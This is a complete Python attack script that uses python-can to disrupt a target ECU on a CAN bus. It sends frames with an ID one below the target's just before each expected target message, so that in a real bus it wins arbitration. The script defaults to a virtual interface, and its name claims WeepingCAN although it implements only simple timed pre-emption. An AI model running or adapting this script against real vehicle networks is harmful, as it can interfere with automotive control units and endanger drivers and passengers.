#!/usr/bin/env python3
import can
import time
import argparse
import random

def main():
    parser = argparse.ArgumentParser(description="WeepingCAN-style timing attack")
    parser.add_argument("--channel", default="vcan0", help="CAN interface (default: vcan0)")
    parser.add_argument("--target-id", type=lambda x: int(x, 0), default=0x200,
                        help="ID of the legitimate ECU we want to disturb (default: 0x200)")
    parser.add_argument("--period", type=float, default=0.05,
                        help="Approximate period of the target ECU (default: 0.05 = 50ms)")
    parser.add_argument("--advance", type=float, default=0.003,
                        help="How much before the target we send (seconds, default: 3ms)")
    parser.add_argument("--jitter", type=float, default=0.001,
                        help="Random jitter added/subtracted (default: 1ms)")
    args = parser.parse_args()

    # ID attaccante: più basso del target per vincere l'arbitraggio (in un bus reale)
    attacker_id = max(0, args.target_id - 1)

    bus = can.interface.Bus(channel=args.channel, bustype="socketcan")

    print(f"[+] WeepingCAN attacker on {args.channel}")
    print(f"    Target ECU ID=0x{args.target_id:X}, attacker ID=0x{attacker_id:X}")
    print(f"    Target period≈{args.period}s, advance={args.advance}s, jitter={args.jitter}s")
    print("    Press Ctrl+C to stop")

    next_time = time.time()
    try:
        while True:
            # calcola quando inviare il prossimo frame
            next_time += args.period
            send_time = next_time - args.advance + random.uniform(-args.jitter, args.jitter)

            # aspetta fino al momento scelto
            now = time.time()
            if send_time > now:
                time.sleep(send_time - now)

            # invia frame attaccante
            msg = can.Message(
                arbitration_id=attacker_id,
                data=b'\xAA\xBB\xCC\xDD\xEE\xFF\x00\x11',
                is_extended_id=False
            )
            bus.send(msg)
    except KeyboardInterrupt:
        print("\n[+] Stopped WeepingCAN attacker")

if __name__ == "__main__":
    main()